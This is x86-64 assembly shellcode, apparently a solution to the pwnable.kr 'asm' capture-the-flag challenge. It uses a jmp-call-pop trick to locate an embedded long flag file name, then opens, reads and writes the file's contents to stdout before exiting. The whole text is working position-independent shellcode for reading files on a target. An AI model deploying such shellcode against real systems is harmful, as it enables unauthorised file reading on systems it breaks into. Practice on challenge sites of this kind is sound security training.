[BITS 64]


[GLOBAL _start]


_start: 
       jmp filename

open:
        mov rax ,2
        pop rdi
        mov rsi, 0
        mov rdx , 0
        syscall 


read:
        mov rdi , rax
        mov rdx, 0x80
        sub rsp, rdx    
        mov rsi, rsp    
        xor rax, rax    
        syscall

write:
        mov rax , 1
        mov rdi , 1 
        mov rsi , rsp 
        mov rdx , 0x80 
        syscall 

exit:
        mov rax , 60
        xor rdi, rdi
        syscall


filename:
        call  open
        flag db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" , 0
